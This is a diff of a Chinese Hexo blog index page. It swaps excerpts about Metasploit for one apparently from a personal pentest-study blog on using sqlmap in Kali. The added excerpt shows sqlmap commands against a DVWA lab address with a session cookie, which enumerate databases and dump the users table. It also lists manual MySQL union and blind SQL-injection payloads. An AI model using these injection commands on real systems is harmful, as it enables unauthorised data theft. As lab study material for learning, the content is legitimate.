-    <article id="post-metasploit_web应用攻击类型" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-sqlmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/13/metasploit_web应用攻击类型/">web应用攻击的主要类型</a>
+      <a class="article-title" href="/2018/06/13/sqlmap/">kail 2.0sqlmap使用</a>
     </h1>
   
 
 		
         
-        <a href="/2018/06/13/metasploit_web应用攻击类型/" class="archive-article-date">
-  	<time datetime="2018-06-13T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-13</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>  普通注入<br>  盲注:攻击者运用脚本通过仅有的判断信息(比如时间差)对表中的每一个字段进行探测。</p>
-<h3 id="跨站脚本"><a href="#跨站脚本" class="headerlink" title="跨站脚本"></a>跨站脚本</h3><p>  恶意使用者将程序代码注入到网页上，其他使用者在浏览网页的时候会受到不同程度的影响。HTML语言以及目标主机使用的脚本语言。<br>  xss攻击分为存储型XSS，反射型XSS,DOM型XSS。</p>
-<h3 id="跨站伪造请求"><a href="#跨站伪造请求" class="headerlink" title="跨站伪造请求"></a>跨站伪造请求</h3><p>  使用XSS注入方式注入一段脚本，通过该脚本伪造受害者发送一个合法请求。</p>
-<h3 id="会话认证管理缺陷"><a href="#会话认证管理缺陷" class="headerlink" title="会话认证管理缺陷"></a>会话认证管理缺陷</h3><p>  首次认证cookie后不对cookie内容进行检查，攻击者可以通过修改cookie的重要信息，提升权限对网站资料进行存取。</p>
-<h3 id="安全误配置"><a href="#安全误配置" class="headerlink" title="安全误配置"></a>安全误配置</h3><h3 id="不安全密码存储"><a href="#不安全密码存储" class="headerlink" title="不安全密码存储"></a>不安全密码存储</h3><p>  敏感资料未加密<br>  使用自己未开发的未经证明的算法<br>  使用强度不足的算法<br>  未经程序处理的key，以及将key存储在不受保护的地方</p>
-<h1 id="基于Metasploit框架的Web应用渗透技术"><a href="#基于Metasploit框架的Web应用渗透技术" class="headerlink" title="基于Metasploit框架的Web应用渗透技术"></a>基于Metasploit框架的Web应用渗透技术</h1><p>辅助模块:wmap<br>渗透模块:</p>
-<h3 id="Web应用漏洞扫描探测"><a href="#Web应用漏洞扫描探测" class="headerlink" title="Web应用漏洞扫描探测"></a>Web应用漏洞扫描探测</h3><p>扫描神奇 W3AF</p>
-<blockquote>
-<p>SQL注入漏洞探测:SQLMAP </p>
-</blockquote>
-<p> use auxiliary/scanner/http/sqlmap</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">metasploit渗透魔鬼训练营笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/13/metasploit_web应用攻击类型/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-metasploit问题集锦" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/13/metasploit问题集锦/">metasploit使用集锦</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/06/13/metasploit问题集锦/" class="archive-article-date">
+        <a href="/2018/06/13/sqlmap/" class="archive-article-date">
   	<time datetime="2018-06-13T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-13</time>
 </a>
         
@@ -1030,16 +1051,13 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
+<p>sqlmap用法</p>
 </blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find / -name sqlmap.py 2&gt;&gt;null</span><br><span class="line">cd /usr/share/sqlmap</span><br><span class="line"></span><br><span class="line">//使用sqlmap检测是路径是否有注入点</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos;</span><br><span class="line">//获取数据库名称 --dbs参数</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; --dbs</span><br><span class="line">//获取表名 -D数据库名称 --tables枚举表名</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; -D dvwa --tables </span><br><span class="line">//枚举数据库下的表的列</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; -D dvwa -T users --columns</span><br><span class="line">//下载数据 --dump</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; --tables -T users --columns --dump</span><br><span class="line">//获取交互的shell</span><br><span class="line">python sqlmap.py -h | grep shell</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>metasploit PostgreSQL数据库</p>
+<p>sql注入</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//Database not connected or cache not built</span><br><span class="line"></span><br><span class="line">service postgresql start</span><br><span class="line">db_rebuild_cache</span><br><span class="line"></span><br><span class="line">db_status //查看数据库连接是否正常</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>模块</p>
-</blockquote>
-<p>辅助模块:auxiliary<br>攻击模块:exploits<br>后渗透攻击模块:post<br>攻击载荷模块:payloads 在渗透攻击成功后，促使目标系统运行一段植入的代码 独立=传输器+传输体<br>空指令模块:nops 为了避免内存地址随机化和返回地址计算偏差等原因导致的shellcode执行失败，添加空指令区<br>编码器模块:encoders</p>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql </span><br><span class="line">1. 使用#或--注释掉后面的</span><br><span class="line">2. 使用union select 1,2 猜测返回的列数</span><br><span class="line">3. 使用union select 1,2 form tables 获取其他表的数据</span><br><span class="line">4. 使用union password,concat(first_name,&apos; &apos;,last_name,&apos; &apos;,user) form users //拼接字段输出更多信息</span><br><span class="line">5. 如果union可行,则可以使用version(),database(),user()等函数获取信息</span><br><span class="line"></span><br><span class="line">//拆半猜解法 最好使用sqlmap等工具</span><br><span class="line">and length(database()) &gt; 11 猜测数据库名长度</span><br><span class="line">and ascii(substring(database(),1,1))&gt;97 猜测第一个字符</span><br></pre></td></tr></table></figure>
       
 
       
@@ -1054,6 +1072,14 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">metasploit渗透魔鬼训练营笔记</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kail</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
+        		</li>
       		
 		</ul>
 	</div>
@@ -1062,7 +1088,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/13/metasploit问题集锦/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/06/13/sqlmap/">展开全文 >></a>
         </p>
       
 
@@ -1205,11 +1231,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
+                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1217,11 +1243,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1266,6 +1292,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Window</a>
               </li>
             
             <div class="clearfix"></div>
